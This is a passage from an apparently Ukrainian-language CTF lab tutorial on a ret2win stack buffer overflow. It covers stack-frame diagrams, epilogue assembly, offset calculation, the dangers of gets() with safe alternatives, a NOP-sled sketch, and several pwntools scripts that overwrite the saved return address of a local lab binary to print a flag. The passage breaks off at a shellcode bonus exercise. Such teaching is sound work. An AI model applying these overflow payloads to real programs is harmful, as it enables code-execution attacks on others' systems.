‚îÇ 0x7ffe...80 ‚îÇ 0x7ffe...b0     ‚îÇ 0x4141...   ‚îÇ ‚Üê –ü–ï–†–ï–ó–ê–ü–ò–°–ê–ù–û –Ω–∞ 'AAAAAAAA'
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 0x7ffe...40 ‚îÇ ????????        ‚îÇ 'A' 'A'     ‚îÇ ‚îê
‚îÇ     ...     ‚îÇ ????????        ‚îÇ 'A' 'A'     ‚îÇ ‚îÇ
‚îÇ     ...     ‚îÇ ????????        ‚îÇ 'A' 'A'     ‚îÇ ‚îÇ name[64]
‚îÇ 0x7ffe...01 ‚îÇ ????????        ‚îÇ 'A' 'A'     ‚îÇ ‚îÇ –∑–∞–ø–æ–≤–Ω–µ–Ω–æ 'A'
‚îÇ 0x7ffe...00 ‚îÇ ????????        ‚îÇ 'A' 'A'     ‚îÇ ‚îò
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–©–û –°–¢–ê–õ–û–°–Ø:**
- –ë–∞–π—Ç–∏ 0-63: –ó–∞–ø–æ–≤–Ω–∏–ª–∏ `name[64]` —Å–∏–º–≤–æ–ª–∞–º–∏ 'A'
- –ë–∞–π—Ç–∏ 64-71: –ü–ï–†–ï–ó–ê–ü–ò–°–ê–õ–ò saved RBP –Ω–∞ 'AAAAAAAA' (0x4141414141414141)
- –ë–∞–π—Ç–∏ 72-79: –ü–ï–†–ï–ó–ê–ü–ò–°–ê–õ–ò saved RIP –Ω–∞ 0x00401136 (–∞–¥—Ä–µ—Å–∞ win)

### –ö–∞–¥—Ä 5: vuln() –∑–∞–≤–µ—Ä—à—É—î—Ç—å—Å—è - –ï–ü–Ü–õ–û–ì

```c
}  // –ö—ñ–Ω–µ—Ü—å —Ñ—É–Ω–∫—Ü—ñ—ó vuln()
```

**–ê—Å–µ–º–±–ª–µ—Ä –µ–ø—ñ–ª–æ–≥—É:**
```asm
; vuln() –µ–ø—ñ–ª–æ–≥:
leave:
  mov    rsp, rbp       ; –í—ñ–¥–Ω–æ–≤–∏—Ç–∏ stack pointer
  pop    rbp            ; –í–∏—Ç—è–≥—Ç–∏ saved RBP –∑—ñ —Å—Ç–µ–∫—É

ret:
  pop    rip            ; –í–∏—Ç—è–≥—Ç–∏ saved RIP –∑—ñ —Å—Ç–µ–∫—É
  jmp    rip            ; –°—Ç—Ä–∏–±–Ω—É—Ç–∏ –Ω–∞ –∞–¥—Ä–µ—Å—É –≤ RIP
```

**–ü–æ–∫—Ä–æ–∫–æ–≤–æ:**

**–ö—Ä–æ–∫ 5.1: leave (mov rsp, rbp)**
```
RSP —Å—Ç–∞—î —Ä—ñ–≤–Ω–∏–º RBP
RSP = 0x7ffe...80
```

**–ö—Ä–æ–∫ 5.2: leave (pop rbp)**
```asm
pop rbp  ; RBP = [RSP]; RSP += 8
```
```
RBP —Ç–µ–ø–µ—Ä = 0x4141414141414141  ‚Üê –ó–ª–∞–º–∞–Ω–æ, –∞–ª–µ –Ω–µ –≤–∞–∂–ª–∏–≤–æ!
RSP = 0x7ffe...88 (–∑—Å—É–Ω—É–≤—Å—è –Ω–∞ 8)
```

**–ö—Ä–æ–∫ 5.3: ret (pop rip)**
```asm
pop rip  ; RIP = [RSP]; RSP += 8
```
```
RIP —Ç–µ–ø–µ—Ä = 0x00401136  ‚Üê –ê–î–†–ï–°–ê WIN()!
RSP = 0x7ffe...90
```

**–ö—Ä–æ–∫ 5.4: ret (jmp rip)**
```asm
jmp 0x00401136  ; –°—Ç—Ä–∏–±–∞—î–º–æ –Ω–∞ win()!
```

### –ö–∞–¥—Ä 6: win() –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è - –£–°–ü–Ü–•!

```c
void win(void){
    puts("FLAG{STAGE6_RET2WIN}");  ‚Üê –í–∏–∫–æ–Ω—É—î—Ç—å—Å—è!
    fflush(stdout);
    _exit(0);                       ‚Üê –í–∏—Ö—ñ–¥ –∑ –ø—Ä–æ–≥—Ä–∞–º–∏
}
```

**–ü—Ä–∞–ø–æ—Ä –≤–∏–≤–µ–¥–µ–Ω–æ!** üéâ

## ‚ùì –ü–∏—Ç–∞–Ω–Ω—è-–í—ñ–¥–ø–æ–≤—ñ–¥—ñ –ø—Ä–æ Buffer Overflow

### Q1: –ß–æ–º—É RBP = 'AAAAAAAA' –Ω–µ –ø—Ä–æ–±–ª–µ–º–∞?

**–í—ñ–¥–ø–æ–≤—ñ–¥—å:** –ë–æ `win()` —Ä–æ–±–∏—Ç—å `_exit(0)` - —Ü–µ **–ø—Ä–∏–º—É—Å–æ–≤–∏–π –≤–∏—Ö—ñ–¥** –∑ –ø—Ä–æ–≥—Ä–∞–º–∏ –ë–ï–ó –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è.

```c
// –Ø–∫–±–∏ win() –º–∞–ª–∞ return:
void win_bad(void){
    puts("FLAG");
    return;  // ‚ùå –°–ø—Ä–æ–±–∞ –ø–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—è
}

// –ï–ø—ñ–ª–æ–≥ win_bad():
leave    ; pop rbp ‚Üí RBP –∑ win —Å—Ç–µ–∫—É (OK)
ret      ; pop rip ‚Üí –ê–¥—Ä–µ—Å–∞ –∑—ñ —Å—Ç–µ–∫—É
         ; –ê–ª–µ —Ç—É—Ç –°–ú–Ü–¢–¢–Ø –±–æ –º–∏ –ø—Ä–∏–π—à–ª–∏ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ!
         ; ‚Üí CRASH!
```

**–ù–∞—à–∞ win() –ø—Ä–∞–≤–∏–ª—å–Ω–∞:**
```c
void win(void){
    puts("FLAG");
    _exit(0);  // ‚úÖ –ó–∞–≤–µ—Ä—à—É—î –í–ï–°–¨ –ø—Ä–æ—Ü–µ—Å
               // –ù–µ –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è!
}
```

### Q2: –©–æ —Å—Ç–∞–Ω–µ—Ç—å—Å—è —è–∫—â–æ offset –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∏–π?

**–Ø–∫—â–æ offset –ú–ï–ù–®–ï 72:**
```python
payload = b'A' * 50 + p64(win_addr)
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç:**
```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ 0x00401234      ‚îÇ ‚Üê saved RIP –ù–ï –ü–ï–†–ï–ó–ê–ü–ò–°–ê–ù–û
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 0x7ffe...       ‚îÇ ‚Üê saved RBP —á–∞—Å—Ç–∫–æ–≤–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–æ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 'A' 'A' ...     ‚îÇ ‚Üê 50 –±–∞–π—Ç 'A'
‚îÇ 0x00401136      ‚îÇ ‚Üê win –∞–¥—Ä–µ—Å–∞ –í–°–ï–†–ï–î–ò–ù–Ü –±—É—Ñ–µ—Ä–∞
‚îÇ (8 –±–∞–π—Ç)        ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

–ü—Ä–æ–≥—Ä–∞–º–∞ **–ø–æ–≤–µ—Ä–Ω–µ—Ç—å—Å—è –≤ main()** —è–∫ –∑–∞–∑–≤–∏—á–∞–π. –ê–¥—Ä–µ—Å–∞ win() –∑–∞–ª–∏—à–∏—Ç—å—Å—è –≤ –±—É—Ñ–µ—Ä—ñ –Ω–µ–≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ—é.

**–Ø–∫—â–æ offset –ë–Ü–õ–¨–®–ï 72:**
```python
payload = b'A' * 80 + p64(win_addr)
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç:**
```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ 0x41414141...   ‚îÇ ‚Üê saved RIP = 'AAAAAAAA' (–Ω–µ –∞–¥—Ä–µ—Å–∞!)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 'A' 'A' 'A' ...  ‚îÇ ‚Üê 80 –±–∞–π—Ç 'A'
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 0x00401136      ‚îÇ ‚Üê win –∞–¥—Ä–µ—Å–∞ –ü–Ü–°–õ–Ø saved RIP
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

–ü—Ä–æ–≥—Ä–∞–º–∞ —Å–ø—Ä–æ–±—É—î —Å—Ç—Ä–∏–±–Ω—É—Ç–∏ –Ω–∞ `0x4141414141414141` ‚Üí **SIGSEGV (–∫—Ä–∞—à)**

### Q3: –ß–æ–º—É gets() —Ç–∞–∫–∏–π –Ω–µ–±–µ–∑–ø–µ—á–Ω–∏–π?

```c
char buf[64];
gets(buf);  // ‚ùå –î–£–ñ–ï –ù–ï–ë–ï–ó–ü–ï–ß–ù–û!
```

**–ü—Ä–æ–±–ª–µ–º–∞:** `gets()` **–ù–ï –ó–ù–ê–Ñ** —Ä–æ–∑–º—ñ—Ä—É –±—É—Ñ–µ—Ä–∞!

**–©–æ —Ä–æ–±–∏—Ç—å gets():**
```c
char* gets(char* buf) {
    int c;
    int i = 0;

    while ((c = getchar()) != '\n' && c != EOF) {
        buf[i++] = c;  // ‚ùå –ó–∞–ø–∏—Å—É—î –°–ö–Ü–õ–¨–ö–ò –ó–ê–í–ì–û–î–ù–û!
                       // –ù–∞–≤—ñ—Ç—å —è–∫—â–æ i > —Ä–æ–∑–º—ñ—Ä buf
    }

    buf[i] = '\0';
    return buf;
}
```

–Ø–∫—â–æ –≤–≤–µ—Å—Ç–∏ 1000 —Å–∏–º–≤–æ–ª—ñ–≤ –≤ `buf[64]` ‚Üí –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –≥–∞—Ä–∞–Ω—Ç–æ–≤–∞–Ω–æ!

**–ë–µ–∑–ø–µ—á–Ω—ñ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∏:**
```c
// ‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û: –æ–±–º–µ–∂—É—î —Ä–æ–∑–º—ñ—Ä
fgets(buf, sizeof(buf), stdin);  // –ú–∞–∫—Å–∏–º—É–º 64 –±–∞–π—Ç–∏

// ‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û: –æ–±–º–µ–∂—É—î —Ä–æ–∑–º—ñ—Ä
read(0, buf, sizeof(buf));       // –ú–∞–∫—Å–∏–º—É–º 64 –±–∞–π—Ç–∏

// ‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û: –∫–æ–Ω—Ç—Ä–æ–ª—é—î —Ä–æ–∑–º—ñ—Ä
scanf("%63s", buf);              // –ú–∞–∫—Å–∏–º—É–º 63 + '\0'
```

### Q4: –ß–∏ –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–ø–æ–≤–Ω–∏—Ç–∏ —Å—Ç–µ–∫ "—É –∑–≤–æ—Ä–æ—Ç–Ω–æ–º—É –Ω–∞–ø—Ä—è–º–∫—É"?

**–í—ñ–¥–ø–æ–≤—ñ–¥—å:** –ù—ñ! –°—Ç–µ–∫ —Ä–æ—Å—Ç–µ –≤—ñ–¥ –≤–∏—Å–æ–∫–∏—Ö –∞–¥—Ä–µ—Å –¥–æ –Ω–∏–∑—å–∫–∏—Ö, –∞–ª–µ **–∑–∞–ø–∏—Å** –π–¥–µ –≤—ñ–¥ –Ω–∏–∑—å–∫–∏—Ö –¥–æ –≤–∏—Å–æ–∫–∏—Ö.

```
        –í–∏—â—ñ –∞–¥—Ä–µ—Å–∏
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   Saved RIP     ‚îÇ 0x7ffe...88
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   Saved RBP     ‚îÇ 0x7ffe...80
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   buf[63]       ‚îÇ 0x7ffe...7f  ‚Üê –ó–∞–ø–∏—Å—É—î—Ç—å—Å—è –û–°–¢–ê–ù–ù–Ü–ú
‚îÇ   buf[1]        ‚îÇ 0x7ffe...41
‚îÇ   buf[0]        ‚îÇ 0x7ffe...40  ‚Üê –ó–∞–ø–∏—Å—É—î—Ç—å—Å—è –ü–ï–†–®–ò–ú
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
        –ù–∏–∂—á—ñ –∞–¥—Ä–µ—Å–∏

read(0, buf, 256)  // –ü–∏—à–µ –≤—ñ–¥ buf[0] ‚Üí buf[1] ‚Üí ... ‚Üí –¥–∞–ª—ñ –∑–∞ –º–µ–∂—ñ!
```

–¢–æ–º—É –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è **–∑–∞–≤–∂–¥–∏ –π–¥–µ –≤–≥–æ—Ä—É** (–¥–æ saved RIP).

### Q5: –©–æ —Ç–∞–∫–µ NOP sled —ñ –Ω–∞–≤—ñ—â–æ –≤—ñ–Ω?

**NOP sled** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∫–æ–ª–∏ –º–∏ –ù–ï –ó–ù–ê–Ñ–ú–û —Ç–æ—á–Ω–æ—ó –∞–¥—Ä–µ—Å–∏:

```python
# –Ø–∫—â–æ –∞–¥—Ä–µ—Å–∞ shellcode –Ω–µ–≤—ñ–¥–æ–º–∞ —Ç–æ—á–Ω–æ:
nop_sled = b'\x90' * 100  # NOP —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó (no operation)
shellcode = b'\x48\x31\xc0...'  # –†–µ–∞–ª—å–Ω–∏–π –∫–æ–¥

payload = nop_sled + shellcode + padding + p64(–ø—Ä–∏–±–ª–∏–∑–Ω–∞_–∞–¥—Ä–µ—Å–∞)
```

**–Ø–∫ –ø—Ä–∞—Ü—é—î:**
- CPU –ø–æ—Ç—Ä–∞–ø–ª—è—î –¥–µ—Å—å –≤ NOP sled
- –í–∏–∫–æ–Ω—É—î NOP, NOP, NOP... (–Ω—ñ—á–æ–≥–æ –Ω–µ —Ä–æ–±–∏—Ç—å)
- "–°–∫–æ–≤–∑–∞—î" –¥–æ shellcode
- –í–∏–∫–æ–Ω—É—î shellcode

**–£ –Ω–∞—à–æ–º—É –≤–∏–ø–∞–¥–∫—É –ù–ï –ü–û–¢–†–Ü–ë–ï–ù** –±–æ:
- –ê–¥—Ä–µ—Å–∞ win() —Ç–æ—á–Ω–æ –≤—ñ–¥–æ–º–∞ (PIE OFF)
- –ù–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ shellcode

### –í—ñ–∑—É–∞–ª—ñ–∑–∞—Ü—ñ—è –ø—Ä–æ—Ü–µ—Å—É

**–î–æ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è:**
```
STACK (vuln()):
        ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  0x7fff...88
        ‚îÇ 0x004011XX      ‚îÇ  ‚Üê saved RIP (–ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –≤ main)
        ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§  0x7fff...80
        ‚îÇ 0x7fff...       ‚îÇ  ‚Üê saved RBP
        ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§  0x7fff...40 ‚Üê RBP
        ‚îÇ name[63] = ?    ‚îÇ
        ‚îÇ ...             ‚îÇ
        ‚îÇ name[0]  = ?    ‚îÇ
        ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚Üê RSP
```

**–ü—ñ—Å–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ payload:**
```
PAYLOAD: 'A'*72 + p64(0x401136)

STACK (–ø—ñ—Å–ª—è read):
        ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
        ‚îÇ 0x00401136      ‚îÇ  ‚Üê saved RIP (–ü–ï–†–ï–ó–ê–ü–ò–°–ê–ù–û –Ω–∞ win!)
        ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
        ‚îÇ 0x4141414141... ‚îÇ  ‚Üê saved RBP (–ü–ï–†–ï–ó–ê–ü–ò–°–ê–ù–û –Ω–∞ 'A'*8)
        ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
        ‚îÇ name[63] = 'A'  ‚îÇ
        ‚îÇ ...             ‚îÇ
        ‚îÇ name[0]  = 'A'  ‚îÇ
        ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–ü—ñ—Å–ª—è return:**
```
CPU: ret
  1. pop rip         ‚Üí rip = 0x00401136
  2. jmp 0x00401136  ‚Üí –°—Ç—Ä–∏–±–∞—î–º–æ –Ω–∞ win()

win() –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è:
  puts("FLAG{STAGE6_RET2WIN}")
  _exit(0)
```

### –ß–æ–º—É offset = 72?

```
–°—Ç–µ–∫–æ–≤–∏–π —Ñ—Ä–µ–π–º vuln():
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ –õ–æ–∫–∞–ª—å–Ω—ñ –∑–º—ñ–Ω–Ω—ñ            ‚îÇ  –ö–æ–º–ø—ñ–ª—è—Ç–æ—Ä –≤–∏–¥—ñ–ª–∏–≤ –º—ñ—Å—Ü–µ
‚îÇ –≤–∫–ª—é—á–Ω–æ –∑ name[64]         ‚îÇ  (–º–æ–∂–µ –±—É—Ç–∏ alignment padding)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Saved RBP (8 –±–∞–π—Ç)         ‚îÇ  –ó–±–µ—Ä–µ–∂–µ–Ω–∏–π base pointer
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Saved RIP (8 –±–∞–π—Ç)         ‚îÇ  ‚Üê –ù–∞—à–∞ —Ü—ñ–ª—å!
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

Offset = –≤—ñ–¥—Å—Ç–∞–Ω—å –≤—ñ–¥ –ø–æ—á–∞—Ç–∫—É name[] –¥–æ saved RIP
       = 64 (name) + 8 (saved RBP)
       = 72 –±–∞–π—Ç–∏
```

### –ï–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç: –ó–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è offset —á–µ—Ä–µ–∑ –∫—Ä–∞—à

**–ú–µ—Ç–æ–¥ 1: –¶–∏–∫–ª—ñ—á–Ω–∏–π –ø–∞—Ç—Ç–µ—Ä–Ω**

```python
#!/usr/bin/env python3
from pwn import *

# –ì–µ–Ω–µ—Ä—É—î–º–æ —É–Ω—ñ–∫–∞–ª—å–Ω–∏–π –ø–∞—Ç—Ç–µ—Ä–Ω
pattern = cyclic(200)
print(f"Pattern: {pattern[:50]}...")

# –ó–∞–ø—É—Å–∫–∞—î–º–æ —ñ –¥–∏–≤–∏–º–æ—Å—è –¥–µ –∫—Ä–∞—à–Ω–µ
io = process('../build/stage06_ret2win')
io.sendlineafter(b'name\n', pattern)

# –ß–µ–∫–∞—î–º–æ –∫—Ä–∞—à
io.wait()

# –Ø–∫—â–æ —î core dump
try:
    core = io.corefile
    rip = core.rip
    log.info(f"RIP at crash: {hex(rip)}")

    # –ó–Ω–∞—Ö–æ–¥–∏–º–æ offset
    offset = cyclic_find(rip)
    log.success(f"Offset: {offset}")
except:
    log.warning("Core dump –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–π")
```

**–ú–µ—Ç–æ–¥ 2: Binary search**

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

def test_offset(offset, target_addr):
    """–ü–µ—Ä–µ–≤—ñ—Ä—è—î —á–∏ –ø—Ä–∞—Ü—é—î –¥–∞–Ω–∏–π offset"""
    try:
        io = process('../build/stage06_ret2win')
        payload = b'A' * offset + p64(target_addr)
        io.sendlineafter(b'name\n', payload)
        response = io.recvall(timeout=1)
        io.close()
        return b'FLAG' in response
    except:
        return False

elf = ELF('../build/stage06_ret2win', checksec=False)
win = elf.symbols['win']

# Binary search
low, high = 50, 100
while low < high:
    mid = (low + high) // 2
    if test_offset(mid, win):
        print(f"[+] –ü—Ä–∞—Ü—é—î –∑ offset {mid}")
        high = mid
    else:
        low = mid + 1

print(f"[+] –ú—ñ–Ω—ñ–º–∞–ª—å–Ω–∏–π offset: {low}")
```

## üéì –ü—Ä–∞–∫—Ç–∏—á–Ω—ñ –∑–∞–≤–¥–∞–Ω–Ω—è

### –ó–∞–≤–¥–∞–Ω–Ω—è 1: –í—ñ–∑—É–∞–ª—ñ–∑–∞—Ü—ñ—è —Å—Ç–µ–∫—É –≤ GDB

```bash
# –ó–∞–ø—É—Å—Ç—ñ—Ç—å –∑ GDB
gdb ../build/stage06_ret2win

# –í GDB:
break vuln              # –¢–æ—á–∫–∞ –∑—É–ø–∏–Ω–∫–∏ –≤ vuln()
run                     # –ó–∞–ø—É—Å–∫
# –í–≤–µ–¥—ñ—Ç—å —â–æ—Å—å –∫–æ—Ä–æ—Ç–∫e: AAAA

# –ü–æ–¥–∏–≤—ñ—Ç—å—Å—è —Å—Ç–µ–∫
x/20gx $rsp             # 20 qword'—ñ–≤ –∑—ñ —Å—Ç–µ–∫—É
info frame              # –Ü–Ω—Ñ–æ –ø—Ä–æ –ø–æ—Ç–æ—á–Ω–∏–π —Ñ—Ä–µ–π–º

# –ü—Ä–æ–¥–æ–≤–∂—Ç–µ –¥–æ return
break *vuln+XX          # –ó–Ω–∞–π–¥—ñ—Ç—å –∞–¥—Ä–µ—Å—É ret —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó
continue

# –ü–æ–¥–∏–≤—ñ—Ç—å—Å—è —â–æ –Ω–∞ —Å—Ç–µ–∫—É –ø–µ—Ä–µ–¥ ret
x/gx $rsp               # –¶–µ saved RIP!
```

### –ó–∞–≤–¥–∞–Ω–Ω—è 2: –ï–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç –∑ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∏–º offset

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('../build/stage06_ret2win', checksec=False)
win = elf.symbols['win']

# –°–ø—Ä–æ–±—É—î–º–æ —Ä—ñ–∑–Ω—ñ offset
for offset in [64, 68, 72, 76, 80]:
    print(f"\n[*] –¢–µ—Å—Ç—É—î–º–æ offset {offset}")
    io = process('../build/stage06_ret2win')

    payload = b'A' * offset + p64(win)
    io.sendlineafter(b'name\n', payload)

    try:
        output = io.recvall(timeout=1).decode()
        if 'FLAG' in output:
            print(f"[+] SUCCESS –∑ offset {offset}")
            print(f"    {output.strip()}")
        else:
            print(f"[-] FAIL: {output.strip()[:50]}")
    except:
        print(f"[-] CRASH")

    io.close()
```

### –ó–∞–≤–¥–∞–Ω–Ω—è 3: –ö–æ–Ω—Ç—Ä–æ–ª—å –±—ñ–ª—å—à–µ –Ω—ñ–∂ RIP

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('../build/stage06_ret2win', checksec=False)
win = elf.symbols['win']
main = elf.symbols['main']

# –°–ø—Ä–æ–±—É—î–º–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ win() ‚Üí main() ‚Üí win()
io = process('../build/stage06_ret2win')

payload = (
    b'A' * 72 +           # Padding
    p64(win) +            # –ü–µ—Ä—à–∏–π return ‚Üí win()
    b'B' * 8 +            # –§–µ–π–∫–æ–≤–∏–π RBP –¥–ª—è win
    p64(main)             # –î—Ä—É–≥–∏–π return ‚Üí main() (–Ω–µ —Å–ø—Ä–∞—Ü—é—î –±–æ win —Ä–æ–±–∏—Ç—å _exit)
)

io.sendlineafter(b'name\n', payload)
print(io.recvall(timeout=1).decode())
io.close()
```

### –ó–∞–≤–¥–∞–Ω–Ω—è 4: Shellcode –∑–∞–º—ñ—Å—Ç—å win() (–±–æ–Ω—É—Å)

–û—Å–∫—ñ–ª—å–∫–∏ NX=OFF, –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ shellcode:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

